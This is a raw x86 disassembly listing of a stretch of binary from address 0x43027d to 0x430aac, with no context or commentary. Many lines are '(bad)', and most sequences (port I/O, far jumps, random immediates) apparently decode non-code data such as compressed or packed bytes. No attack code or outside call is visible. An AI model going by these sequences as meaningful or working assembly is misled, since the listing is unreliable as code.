  43027d:	hlt    
  43027e:	add    al,0xa5
  430280:	mov    al,0xff
  430282:	add    bh,bh
  430284:	add    BYTE PTR [ebx],dh
  430286:	inc    DWORD PTR [ebx]
  430288:	sbb    al,0x89
  43028a:	jne    0x430268
  43028c:	mov    esp,DWORD PTR [ecx+0x4500fc]
  430292:	mov    eax,DWORD PTR [ebp-0xff0048]
  430298:	mov    DWORD PTR [eax-0x70],0xec58ed89
  43029f:	inc    DWORD PTR [ebp-0x75]
  4302a2:	fisttp QWORD PTR [esi+ebp*8]
  4302a5:	test   DWORD PTR [esi-0x1],esp
  4302a8:	inc    ebp
  4302a9:	(bad)  
  4302aa:	aas    
  4302ab:	inc    ebp
  4302ac:	(bad)  
  4302ad:	lea    edi,[esp+eiz*2-0x1]
  4302b1:	inc    edi
  4302b3:	mov    DWORD PTR ds:0x8000c7a0,edi
  4302b9:	mov    ebp,esp
  4302bb:	cld    
  4302bc:	loop   0x43024b
  4302be:	inc    ebp
  4302bf:	(bad)  
  4302c0:	out    dx,al
  4302c1:	(bad)  
  4302c2:	fisttp WORD PTR [eax+0x8801c7]
  4302c8:	jecxz  0x43030f
  4302ca:	in     al,dx
  4302cb:	inc    DWORD PTR [ebp-0x4]
  4302ce:	out    0x8d,eax
  4302d0:	aas    
  4302d1:	inc    edi
  4302d3:	jmp    FWORD PTR [eax-0x78]
  4302d6:	inc    DWORD PTR [ecx]
  4302d8:	mov    DWORD PTR [eax],0xc7043d
  4302de:	ins    BYTE PTR es:[edi],dx
  4302df:	test   edi,edi
  4302e1:	pandn  mm0,mm5
  4302e4:	aas    
  4302e5:	add    bh,al
  4302e7:	mov    esi,DWORD PTR [eax-0x4]
  4302ea:	inc    DWORD PTR [eax+0xdf01ee]
  4302f0:	(bad)  
  4302f1:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4302f5:	mov    ebp,ebx
  4302f7:	xchg   esp,eax
  4302f8:	fild   DWORD PTR [eax]
  4302fa:	(bad)  
  4302fb:	mov    edi,DWORD PTR [eax+0x3]
  4302fe:	(bad)  
  4302ff:	cmp    al,0xe7
  430301:	dec    ebp
  430302:	leave  
  430303:	mov    ebp,eax
  430305:	fsubr  DWORD PTR [edx]
  430307:	add    BYTE PTR [eax],al
  430309:	lea    ecx,[ebx-0x7f0003b4]
  43030f:	push   edx
  430310:	add    DWORD PTR [ebp+0x0],edx
  430313:	mov    esi,DWORD PTR [eax]
  430315:	mov    WORD PTR [edi],ss
  430317:	add    BYTE PTR [eax],al
  430319:	mov    eax,DWORD PTR [ebp-0x74778afd]
  43031f:	add    ah,bh
  430321:	push   0x7d
  430323:	dec    DWORD PTR [ebx+0xd88c]
  430329:	push   edx
  43032a:	mov    edx,DWORD PTR [ecx-0x4]
  43032d:	call   DWORD PTR [eax+0x7d01fc]
  430333:	mov    esi,DWORD PTR [esi]
  430335:	cld    
  430336:	add    BYTE PTR [eax+0x560150],dl
  43033c:	test   DWORD PTR [ebp+0x75],eax
  43033f:	loop   0x4302cc
  430341:	jmp    0xe38b:0x947dc7fc
  430348:	fsub   st,st(7)
  43034a:	add    bh,al
  43034c:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  430352:	add    edi,edi
  430354:	add    bh,bh
  430356:	adc    al,0xed
  430358:	add    dh,ah
  43035a:	push   eax
  43035b:	inc    ebp
  43035c:	push   esi
  43035d:	fisttp WORD PTR [ebx+0x4dc7f43f]
  430363:	test   BYTE PTR [ebx],dh
  430365:	out    0x5,al
  430367:	shl    BYTE PTR [edx+0x45],0x0
  43036b:	jmp    0x43032e
  43036d:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  430374:	inc    esi
  430375:	jle    0x430377
  430377:	test   edi,eax
  430379:	(bad)  
  43037a:	call   0x130047e
  43037f:	out    0x75,al
  430381:	test   DWORD PTR [ebx+0x45fffcff],ecx
  430387:	in     al,dx
  430388:	mov    esp,edx
  43038a:	mov    ah,0x85
  43038c:	add    bh,bh
  43038e:	call   0x1292d92
  430393:	ror    BYTE PTR [ebx-0x7f00037b],0xff
  43039a:	add    ebx,esp
  43039c:	add    ah,ch
  43039e:	xor    BYTE PTR [ebp-0xff0073],al
  4303a4:	mov    ebx,ebp
  4303a6:	cld    
  4303a7:	jle    0x430332
  4303a9:	add    DWORD PTR gs:[eax],eax
  4303ac:	add    BYTE PTR [eax+0x1],dl
  4303af:	inc    ebp
  4303b0:	inc    ebp
  4303b1:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  4303b7:	dec    DWORD PTR [ebx-0x3fd80318]
  4303bd:	add    BYTE PTR [ebp-0xbf0040],dl
  4303c3:	inc    ebp
  4303c4:	fmul   QWORD PTR [ebx-0x4faf0400]
  4303ca:	inc    ebp
  4303cb:	add    DWORD PTR [ebx+0x459c00],ecx
  4303d1:	mov    edi,edi
  4303d3:	mov    eax,0xe80800ff
  4303d8:	inc    ebp
  4303d9:	sub    cl,BYTE PTR [ebx-0x47000400]
  4303df:	add    al,0x1
  4303e1:	rol    BYTE PTR [eax],0x1e
  4303e4:	jne    0x43042b
  4303e6:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  4303ec:	inc    DWORD PTR [ecx]
  4303ee:	call   0x882cf3
  4303f3:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  4303f9:	call   0x432dff
  4303fe:	xor    bh,bh
  430400:	push   edi
  430401:	adc    BYTE PTR [ebx-0x74741bbb],al
  430407:	fsub   st,st(4)
  430409:	ret    
  43040a:	loopne 0x4303a7
  43040c:	xor    DWORD PTR [edx],0x31
  43040f:	cmp    edi,edi
  430411:	bswap  eax
  430413:	rol    BYTE PTR gs:[eax],0x5
  430417:	jmp    0x12e0561
  43041c:	mov    eax,DWORD PTR [ebp-0x4]
  43041f:	add    BYTE PTR [eax+0xff0100],bh
  430425:	cld    
  430426:	jne    0x4304a5
  430428:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  43042e:	jb     0x430431
  430430:	add    BYTE PTR [eax],al
  430432:	push   eax
  430433:	fild   DWORD PTR [ebp+0x0]
  430436:	mov    edx,DWORD PTR [eax-0x68]
  430439:	inc    ebp
  43043a:	add    BYTE PTR [ebx+0xffa8ff],cl
  430440:	or     bh,bh
  430442:	inc    ebp
  430443:	call   0x1272b47
  430448:	jge    0x430497
  43044a:	adc    BYTE PTR [ebx+0x459cb9],cl
  430450:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  430456:	fwait
  430457:	mov    eax,0x30132
  43045c:	lea    esi,[ebp+0x2c]
  43045f:	xor    edi,edi
  430461:	(bad)  
  430462:	call   0x1422dcf
  430467:	call   0x1372df7
  43046c:	jne    0x4303f9
  43046e:	xor    edi,esp
  430470:	add    eax,DWORD PTR [eax+0xc018d]
  430476:	push   DWORD PTR [eax]
  430478:	call   0xcc2dd4
  43047d:	enter  0x45ff,0xe0
  430481:	mov    ecx,DWORD PTR [ebp-0x28]
  430484:	xor    eax,DWORD PTR [eax]
  430486:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  43048c:	(bad)  
  43048d:	xchg   ebp,eax
  43048e:	call   0x1420592
  430493:	mov    cl,0x45
  430495:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  43049b:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff65]
  4304a2:	mov    edi,edi
  4304a4:	or     BYTE PTR [eax],cl
  4304a6:	inc    ebp
  4304a7:	test   DWORD PTR gs:[eax],eax
  4304aa:	je     0x4304f1
  4304ac:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  4304b2:	xor    edx,DWORD PTR [eax-0x73]
  4304b5:	push   ebp
  4304b6:	or     BYTE PTR [ebp+0x21007572],al
  4304bc:	inc    ebp
  4304bd:	loopne 0x43044a
  4304bf:	sub    BYTE PTR [ebp+eax*2-0x279a743d],bh
  4304c6:	int    0x0
  4304c8:	sub    ecx,DWORD PTR [ebx-0x3f2703fd]
  4304ce:	inc    ebp
  4304cf:	push   ebp
  4304d0:	cmp    ebp,eax
  4304d2:	movaps XMMWORD PTR [eax-0x74740100],xmm4
  4304d9:	cld    
  4304da:	fadd   QWORD PTR [eax+0x3b014d]
  4304e0:	jne    0x430512
  4304e2:	push   0xf8898557
  4304e7:	loopne 0x43055e
  4304e9:	inc    ebp
  4304ea:	lea    eax,[ebx+0x72e8e4cc]
  4304f0:	xor    DWORD PTR [ebx+0x7545bc00],ecx
  4304f6:	jmp    0x43052b
  4304f8:	mov    edi,DWORD PTR [edi+0x4572bc]
  4304fe:	xor    eax,edi
  430500:	adc    DWORD PTR [ebp-0xcd0065],0x8b3d31
  43050a:	rcl    BYTE PTR [eax-0x40],1
  43050d:	inc    ebp
  43050e:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  430516:	inc    ebp
  430517:	xchg   ebp,eax
  430518:	ud0    ebp,DWORD PTR [ebx]
  43051b:	inc    DWORD PTR [eax]
  43051d:	daa    
  43051e:	jbe    0x430520
  430520:	mov    dl,BYTE PTR [eax-0x80]
  430523:	push   ebp
  430524:	pop    ds
  430525:	mov    ecx,DWORD PTR [esp+esi*8]
  430528:	inc    eax
  430529:	retf   
  43052a:	inc    ebp
  43052b:	iret   
  43052c:	jb     0x4304f6
  43052e:	mov    eax,DWORD PTR [edi]
  430530:	int3   
  430531:	inc    ebp
  430532:	inc    ebp
  430533:	add    DWORD PTR [ecx],esi
  430535:	add    BYTE PTR [ebx+ecx*4+0x4df0bc89],bl
  43053c:	xor    dh,BYTE PTR [ebx]
  43053e:	pushf  
  43053f:	lea    ecx,[ecx+0x4d72d808]
  430545:	add    BYTE PTR [ebx],dh
  430547:	inc    ebp
  430548:	mov    DWORD PTR [ebx-0x3f64174c],ecx
  43054e:	xor    dl,BYTE PTR [edx]
  430550:	add    eax,DWORD PTR [ebp-0x77]
  430553:	mov    eax,esp
  430555:	fmul   QWORD PTR [ebp-0x3d]
  430558:	xor    eax,DWORD PTR [ebx+eax*1+0x832899b]
  43055f:	mov    DWORD PTR [ebp-0x24],eax
  430562:	rol    DWORD PTR [ebp-0x64],1
  430565:	xor    eax,edi
  430567:	mov    ecx,0xff858db0
  43056c:	clc    
  43056d:	enter  0x4d45,0x3c
  430571:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  430578:	test   esi,edi
  43057a:	clc    
  43057b:	inc    DWORD PTR [ebp+0x45]
  43057e:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  430586:	test   DWORD PTR [ecx],esi
  430588:	clc    
  430589:	pushf  
  43058a:	inc    ebp
  43058b:	(bad)  
  43058c:	cmp    ah,bh
  43058e:	pushf  
  43058f:	inc    ebp
  430590:	mov    edx,DWORD PTR [eax-0x24]
  430593:	add    BYTE PTR [ebp+0x0],dl
  430596:	xor    ecx,DWORD PTR [ecx+0x103bd003]
  43059c:	cmovge edx,DWORD PTR [ebx+ecx*4]
  4305a0:	add    al,dl
  4305a2:	jmp    0x1040772
  4305a7:	jb     0x4305f6
  4305a9:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  4305af:	xor    ecx,DWORD PTR [ebp+0x3b]
  4305b2:	xor    ecx,DWORD PTR [edi]
  4305b4:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  4305b8:	(bad)  
  4305ba:	clc    
  4305bb:	int3   
  4305bc:	add    BYTE PTR [ebx+ecx*4+0x5500b007],al
  4305c3:	push   cs
  4305c4:	xor    ecx,eax
  4305c6:	xor    esp,ecx
  4305c8:	add    ebp,DWORD PTR [eax]
  4305ca:	add    esi,DWORD PTR [eax]
  4305cc:	(bad)  
  4305ce:	retf   0x55cc
  4305d1:	repnz mov eax,DWORD PTR [ebp-0x10]
  4305d5:	(bad)  
  4305d6:	cli    
  4305d7:	fdiv   st(1),st
  4305d9:	test   DWORD PTR [eax+edi*8],ecx
  4305dc:	dec    ebp
  4305dd:	inc    ebp
  4305de:	xor    edi,DWORD PTR [eax-0x7167afd]
  4305e4:	add    BYTE PTR [ebp+0x0],al
  4305e7:	mov    ecx,DWORD PTR [ebp-0x24]
  4305ea:	mov    ecx,ebx
  4305ec:	clc    
  4305ed:	jne    0x4305ba
  4305ef:	mov    esi,0xd672d3
  4305f4:	into   
  4305f5:	into   
  4305f6:	scas   eax,DWORD PTR es:[edi]
  4305f7:	dec    ebp
  4305f8:	mov    ecx,DWORD PTR [ebx-0x3482233c]
  4305fe:	sub    ecx,esi
  430600:	cmp    ecx,DWORD PTR [ebp+0x77]
  430603:	(bad)  
  430604:	mov    edi,eax
  430606:	mov    al,0x85
  430608:	mov    eax,edi
  43060a:	add    BYTE PTR [ebp-0x75],al
  43060d:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  430614:	xor    eax,DWORD PTR [ebp+0x4503f803]
  43061a:	(bad)  
  43061c:	retf   0x559c
  43061f:	(bad)  
  430620:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  430627:	inc    ebp
  430628:	add    eax,0xeb9c4d3f
  43062d:	(bad)  
  43062e:	mov    ecx,eax
  430630:	lods   al,BYTE PTR ds:[esi]
  430631:	test   DWORD PTR [ebp-0x8],edx
  430634:	xor    ecx,DWORD PTR [ebp+0x33]
  430637:	mov    eax,DWORD PTR [ebx]
  430639:	lock add ecx,ebx
  43063c:	bswap  esi
  43063e:	retf   0x55d1
  430641:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  430647:	jmp    0x430642
  430649:	add    BYTE PTR ds:0xebc44d8b,al
  43064f:	push   ebp
  430650:	mov    ebp,DWORD PTR [ebx]
  430652:	test   al,0x8b
  430654:	push   ebp
  430655:	clc    
  430656:	xor    ecx,ebx
  430658:	xor    ecx,esi
  43065a:	add    edx,ecx
  43065c:	add    eax,DWORD PTR [edx+0xca010f]
  430662:	push   ebp
  430663:	dec    ebp
  430664:	mov    ecx,DWORD PTR [ebx-0x34050710]
  43066a:	stc    
  43066b:	rol    DWORD PTR ds:0xebce4dd6,cl
  430671:	scas   eax,DWORD PTR es:[edi]
  430672:	mov    ecx,DWORD PTR [ebx+0x7d55c4c8]
  430678:	xor    ebp,DWORD PTR [ebx]
  43067a:	xor    edi,DWORD PTR [ebx]
  43067c:	add    esi,DWORD PTR [edi+0x3]
  43067f:	mov    ecx,DWORD PTR [edi]
  430681:	clc    
  430682:	retf   0x55cb
  430685:	into   
  430686:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  43068d:	mov    eax,0x3376554d
  430692:	mov    esi,DWORD PTR [ebx]
  430694:	enter  0x5503,0x3
  430698:	xor    ecx,DWORD PTR [edi]
  43069a:	xor    ecx,edx
  43069c:	add    edx,DWORD PTR [ebp+0x3]
  43069f:	mov    ecx,DWORD PTR [edi]
  4306a1:	lock retf 0x4dfa
  4306a5:	stc    
  4306a6:	mov    ecx,DWORD PTR [eax]
  4306a8:	or     BYTE PTR [ebp+0x4d],cl
  4306ab:	jmp    0x107073b
  4306b0:	dec    ebp
  4306b1:	dec    ebp
  4306b2:	(bad)  
  4306b3:	mov    esp,esp
  4306b5:	clc    
  4306b6:	test   ebx,ecx
  4306b8:	clc    
  4306b9:	ror    DWORD PTR [ebp-0x2a],cl
  4306bc:	mov    esi,ecx
  4306be:	in     al,dx
  4306bf:	scas   eax,DWORD PTR es:[edi]
  4306c0:	inc    ebp
  4306c1:	mov    esi,DWORD PTR [ebx]
  4306c3:	les    ebx,FWORD PTR [ebp+edi*2+0x3be42b8b]
  4306ca:	retf   
  4306cb:	ja     0x43069b
  4306cd:	mov    ebp,DWORD PTR [eax-0x48]
  4306d0:	dec    ebp
  4306d1:	xor    ecx,DWORD PTR [di+0x3]
  4306d5:	mov    ebp,eax
  4306d7:	clc    
  4306d8:	push   ebp
  4306d9:	retf   
  4306da:	mov    dl,bl
  4306dc:	adc    esi,edx
  4306de:	jb     0x4306ae
  4306e0:	add    BYTE PTR [edi-0x3b7474b3],ch
  4306e6:	in     al,dx
  4306e7:	jge    0x4306b4
  4306e9:	sub    ecx,DWORD PTR [ebp+0x3b]
  4306ec:	mov    esi,DWORD PTR [edi-0x24]
  4306ef:	mov    ecx,DWORD PTR [esp+eiz*4+0x4d32459b]
  4306f6:	mov    BYTE PTR [ebx-0x34b20729],cl
  4306fc:	mov    edx,ebx
  4306fe:	in     al,dx
  4306ff:	(bad)  
  430700:	ror    esi,cl
  430702:	push   ebp
  430703:	scas   eax,DWORD PTR es:[edi]
  430704:	mov    ecx,DWORD PTR [ebx+0x7d8cc4dc]
  43070a:	fwait
  43070b:	sub    esi,DWORD PTR [edx]
  43070d:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430713:	lods   al,BYTE PTR ds:[esi]
  430714:	xor    esp,DWORD PTR [ebx]
  430716:	add    ecx,DWORD PTR [ebp-0x18]
  430719:	mov    edi,DWORD PTR [ebp-0x8]
  43071c:	mov    bl,cl
  43071e:	cmp    dl,bl
  430720:	jb     0x4306f0
  430722:	add    dh,dl
  430724:	dec    ebp
  430725:	scas   eax,DWORD PTR es:[edi]
  430726:	mov    ecx,DWORD PTR [ebx+0x7dcbc4ec]
  43072c:	shr    DWORD PTR [ebx],cl
  43072e:	into   
  43072f:	cmp    edx,esi
  430731:	mov    ebp,DWORD PTR [edi-0x17fcfc58]
  430737:	dec    ebp
  430738:	dec    ebp
  430739:	mov    ecx,DWORD PTR [ebx+0x55d3ecf8]
  43073f:	retf   
  430740:	xor    edx,esi
  430742:	add    ecx,esi
  430744:	imul   ecx,edx
  430747:	mov    DWORD PTR [ebp+0x8],edx
  43074a:	xor    ecx,DWORD PTR [ebp+0x2b]
  43074d:	mov    DWORD PTR [ebx+0x7d4dece0],ecx
  430753:	add    esi,DWORD PTR [ebx]
  430755:	mov    ah,0x3
  430757:	inc    ebp
  430758:	rdtsc  
  43075a:	xlat   BYTE PTR ds:[ebx]
  43075b:	pushf  
  43075c:	jge    0x4306e7
  43075e:	xor    ebx,esp
  430760:	sub    eax,DWORD PTR [ebp-0x73]
  430763:	(bad)  
  430764:	cmp    al,al
  430766:	jb     0x4306ed
  430768:	add    al,bh
  43076a:	ror    DWORD PTR [ebp-0x7a],1
  43076d:	xor    edi,edi
  43076f:	add    edi,edi
  430771:	jmp    0x4307c0
  430773:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  430779:	dec    ebp
  43077a:	into   
  43077b:	mov    ebp,DWORD PTR [edi-0x1b737424]
  430781:	fwait
  430782:	shl    DWORD PTR [edx],cl
  430784:	retf   0x5588
  430787:	or     ecx,DWORD PTR [ebp+0x7233114d]
  43078d:	add    eax,DWORD PTR [eax]
  43078f:	call   0x8ace5ce1
  430794:	fcom   DWORD PTR [ecx]
  430796:	retf   
  430797:	jb     0x4307fe
  430799:	add    ch,cl
  43079b:	dec    ebp
  43079c:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  4307a2:	dec    ebp
  4307a3:	xor    ecx,DWORD PTR [ebx-0x34173bfd]
  4307a9:	jge    0x430779
  4307ab:	mov    BYTE PTR [edi+0xf723b3a],ch
  4307b1:	add    cl,dh
  4307b3:	dec    ebp
  4307b4:	dec    DWORD PTR [ebx-0x2c031b75]
  4307ba:	adc    BYTE PTR [ebp+0x1],0x8b
  4307be:	add    ah,bl
  4307c0:	jge    0x43074e
  4307c2:	push   0xffffff9b
  4307c4:	push   0x8b3032
  4307c9:	shl    BYTE PTR [ebp+0x55],0x6a
  4307cd:	xor    edi,edi
  4307cf:	xor    edx,DWORD PTR [ebx+eax*1]
  4307d2:	inc    ebp
  4307d3:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  4307d9:	dec    ebp
  4307da:	or     BYTE PTR [ecx+0x4dcce883],cl
  4307e0:	jbe    0x43076d
  4307e2:	mov    esp,eax
  4307e4:	ror    bl,1
  4307e6:	enter  0x14ce,0xaf
  4307ea:	dec    DWORD PTR [ebx-0x2cef13f8]
  4307f0:	push   ebp
  4307f1:	retf   0x5540
  4307f4:	push   ebp
  4307f5:	mov    esi,DWORD PTR [edx-0x18]
  4307f8:	mov    edx,ebx
  4307fa:	cld    
  4307fb:	(bad)  
  4307fc:	sub    BYTE PTR [edi-0x1bff74ff],0x0
  430803:	sti    
  430804:	add    dh,cl
  430806:	push   0xffffff94
  430808:	call   FWORD PTR [ebx+0x3b5032d0]
  43080e:	mov    ecx,DWORD PTR [edi]
  430810:	enter  0x455e,0xff
  430814:	mov    DWORD PTR [ebx+0x5545eccc],ecx
  43081a:	xor    esi,DWORD PTR [ebx]
  43081c:	mov    DWORD PTR [ebx],0xcace0f9c
  430822:	aas    
  430823:	push   ebp
  430824:	inc    ebp
  430825:	xor    edx,esi
  430827:	add    edx,esi
  430829:	mov    eax,DWORD PTR [ebx]
  43082b:	(bad)  
  43082c:	jmp    0x4307ba
  43082e:	mov    bl,BYTE PTR [ebx-0x7674cdfb]
  430834:	rol    ah,1
  430836:	mov    esi,0xf133104d
  43083b:	mov    edx,0xff388d80
  430840:	mov    dh,0xd1
  430842:	cmp    edx,DWORD PTR [ebp+0xf]
  430845:	mov    eax,DWORD PTR [edx-0x28]
  430848:	add    BYTE PTR [ebp-0x75],bh
  43084b:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  430852:	fwait
  430853:	retf   0x8632
  430856:	cmp    ebp,0x8
  430859:	call   ebx
  43085b:	inc    ebp
  43085c:	inc    ebp
  43085d:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  430863:	mov    esi,DWORD PTR [ecx]
  430865:	int3   
  430866:	pushf  
  430867:	add    al,0xc7
  430869:	add    al,al
  43086b:	add    bl,al
  43086d:	(bad)  
  43086e:	clc    
  43086f:	int3   
  430870:	inc    ebp
  430871:	add    BYTE PTR [ecx],dh
  430873:	push   eax
  430874:	pushf  
  430875:	mov    edi,eax
  430877:	enter  0xc008,0x85
  43087b:	aas    
  43087c:	clc    
  43087d:	gs inc ebp
  43087f:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  430885:	push   ss
  430886:	xor    ecx,DWORD PTR [ebp+0x3]
  430889:	sub    edx,DWORD PTR [ecx-0x76]
  43088c:	dec    ebp
  43088d:	add    DWORD PTR [ebx+0x88d845],ecx
  430893:	mov    esi,DWORD PTR [ebx]
  430895:	or     BYTE PTR [ebx],al
  430897:	cmp    edx,DWORD PTR [ecx-0x34]
  43089a:	dec    ebp
  43089b:	out    dx,eax
  43089c:	xor    eax,DWORD PTR [ebp+0x3]
  43089f:	mov    edx,DWORD PTR [ecx-0x28]
  4308a2:	dec    ebp
  4308a3:	add    BYTE PTR [ebx],dh
  4308a5:	push   0x518003
  4308aa:	push   eax
  4308ab:	add    BYTE PTR [ebx-0x300748b],cl
  4308b1:	sbb    BYTE PTR [ebp+0x45],cl
  4308b4:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  4308ba:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  4308c0:	dec    ebp
  4308c1:	inc    ebp
  4308c2:	xor    edx,esi
  4308c4:	add    edx,esi
  4308c6:	push   ecx
  4308c7:	(bad)  
  4308c8:	dec    ebp
  4308c9:	mov    al,ds:0xc5d83dff
  4308ce:	retf   
  4308cf:	(bad)  
  4308d0:	into   
  4308d1:	sub    bh,bh
  4308d3:	dec    esp
  4308d4:	adc    al,0x9c
  4308d6:	inc    ebp
  4308d7:	push   ebp
  4308d8:	test   DWORD PTR [edi],ecx
  4308da:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab9ff80]
  4308e1:	jmp    0xc9bc17f5
  4308e6:	add    cl,dl
  4308e8:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  4308f2:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  4308f8:	rol    BYTE PTR [eax],0x54
  4308fb:	clc    
  4308fc:	gs jb  0x430906
  4308ff:	mov    eax,DWORD PTR [ebp-0x30]
  430902:	xor    al,0x40
  430904:	sub    al,0xc7
  430906:	mov    al,ah
  430908:	add    DWORD PTR [ebp+0x4534f845],eax
  43090e:	sub    al,0x80
  430910:	mov    BYTE PTR [edx+eax*1-0x375a39],bl
  430917:	mov    ch,0xff
  430919:	clc    
  43091a:	add    DWORD PTR [ebp+0x60],0x3d
  43091e:	call   FWORD PTR [eax+eax*1-0x277a77]
  430925:	inc    ebp
  430926:	dec    DWORD PTR [ebx-0x3427f701]
  43092c:	test   esi,ecx
  43092e:	dec    DWORD PTR [ebx-0x7f8a3701]
  430934:	push   eax
  430935:	add    DWORD PTR [ebp+0x0],eax
  430938:	dec    ebx
  43093a:	or     al,0xce
  43093c:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  430943:	into   
  430944:	add    BYTE PTR [ebx-0x34ff2000],cl
  43094a:	mov    esi,ecx
  43094c:	sar    bh,0x45
  43094f:	adc    al,0x8b
  430951:	clc    
  430952:	fadd   DWORD PTR [ebp+0x0]
  430955:	mov    ebp,DWORD PTR [edx+0x8]
  430958:	push   edi
  430959:	adc    BYTE PTR [eax+0x1],0x83
  43095d:	add    al,al
  43095f:	retf   
  430960:	mov    ecx,esi
  430962:	cld    
  430963:	mov    eax,DWORD PTR [eax+0xcb01c8]
  430969:	into   
  43096a:	add    BYTE PTR [ebx+0x756ae000],cl
  430970:	jne    0x4309a5
  430972:	inc    DWORD PTR [ebx]
  430974:	rcl    BYTE PTR [ecx+0x50],1
  430977:	push   eax
  430978:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  43097e:	mov    eax,DWORD PTR [eax+ebx*8-0x14ffbafd]
  430985:	sar    bh,0x84
  430988:	or     BYTE PTR [ebx],al
  43098a:	push   eax
  43098b:	add    BYTE PTR [ebx+0x453ccc45],cl
  430991:	pushf  
  430992:	xor    edi,eax
  430994:	pushf  
  430995:	mov    ah,0x89
  430997:	test   esp,ebp
  430999:	clc    
  43099a:	inc    ebp
  43099b:	inc    ebp
  43099c:	mov    DWORD PTR [eax+eax*8],esi
  43099f:	sub    al,0x32
  4309a1:	mov    BYTE PTR [ebx+ecx*4+0x54dce089],bl
  4309a8:	dec    ebp
  4309a9:	xor    eax,DWORD PTR gs:[edi+0x3]
  4309ad:	mov    ecx,DWORD PTR [ecx+0x4d54f4b4]
  4309b3:	xor    eax,DWORD PTR gs:[edi+0x3]
  4309b7:	or     DWORD PTR [ecx+0x45ff085c],0x0
  4309be:	shl    DWORD PTR [ebp-0x380064],1
  4309c4:	enter  0x858d,0x60
  4309c8:	clc    
  4309c9:	inc    DWORD PTR [ebp+0x50]
  4309cc:	cmp    al,0x75
  4309ce:	pushf  
  4309cf:	(bad)  
  4309d0:	(bad)  
  4309d1:	pop    esp
  4309d2:	lods   al,BYTE PTR ds:[esi]
  4309d3:	inc    DWORD PTR [ebp+0x4508f8ff]
  4309d9:	mov    edi,DWORD PTR [esi]
  4309db:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  4309e2:	test   DWORD PTR [edi-0x8],edx
  4309e5:	sbb    al,0x45
  4309e7:	add    BYTE PTR [eax],bh
  4309e9:	push   0x8b809c
  4309ee:	loopne 0x430a35
  4309f0:	push   ebp
  4309f1:	mov    esi,DWORD PTR [ebx]
  4309f3:	cld    
  4309f4:	add    eax,DWORD PTR [eax+0xf013b]
  4309fa:	adc    al,0x0
  4309fc:	add    bh,bh
  4309fe:	jmp    0xc00b1b
  430a03:	add    BYTE PTR [ebp+0x45],cl
  430a06:	mov    ecx,DWORD PTR [ebx+0xd1d8ec]
  430a0c:	dec    ebp
  430a0d:	push   0x38033
  430a12:	cmp    eax,DWORD PTR [eax]
  430a14:	unpcklps xmm7,xmm0
  430a17:	jne    0x430a19
  430a19:	dec    DWORD PTR [ebx+0x5545c818]
  430a1f:	mov    DWORD PTR [ebx],esi
  430a21:	shl    BYTE PTR [ebx],1
  430a23:	inc    ebp
  430a24:	add    ecx,DWORD PTR [ecx+0x60fcc03]
  430a2a:	retf   0x5575
  430a2d:	dec    DWORD PTR [ebx-0x5ba13e8]
  430a33:	(bad)  
  430a34:	stc    
  430a35:	loopne 0x430a43
  430a37:	test   DWORD PTR [ebp-0x8],ecx
  430a3a:	xor    eax,DWORD PTR [ebp+0x3]
  430a3d:	mov    ebp,ecx
  430a3f:	rol    BYTE PTR [eax],1
  430a41:	inc    ebp
  430a42:	add    BYTE PTR [eax-0x7747ab3],bh
  430a48:	clc    
  430a49:	inc    ebp
  430a4a:	retf   
  430a4b:	mov    edx,ebx
  430a4d:	loopne 0x430a25
  430a4f:	retf   
  430a50:	into   
  430a51:	into   
  430a52:	scas   eax,DWORD PTR es:[edi]
  430a53:	dec    ebp
  430a54:	mov    ecx,DWORD PTR [ebx-0x34821f0c]
  430a5a:	sub    ecx,esi
  430a5c:	cmp    ecx,DWORD PTR [ebp+0x77]
  430a5f:	(bad)  
  430a60:	mov    edi,eax
  430a62:	enter  0x8985,0xf8
  430a66:	add    BYTE PTR [ebp-0x75],al
  430a69:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  430a70:	xor    eax,DWORD PTR [ebp+0x4503f803]
  430a76:	(bad)  
  430a78:	retf   0x559c
  430a7b:	(bad)  
  430a7c:	mov    esp,DWORD PTR [esp+ebp*8-0x607057b]
  430a83:	inc    ebp
  430a84:	add    eax,0xeb9c4d3f
  430a89:	(bad)  
  430a8a:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  430a90:	xor    ecx,DWORD PTR [ebp+0x33]
  430a93:	mov    eax,DWORD PTR [ebx]
  430a95:	in     al,dx
  430a96:	add    ecx,ebx
  430a98:	bswap  esi
  430a9a:	retf   0x55d1
  430a9d:	test   BYTE PTR [ebx-0x5ff13fe],cl
  430aa3:	jmp    0x430a9e
  430aa5:	add    BYTE PTR ds:0xebf44d8b,al
  430aab:	push   ebp
  430aac:	mov    ebp,DWORD PTR [ebx]
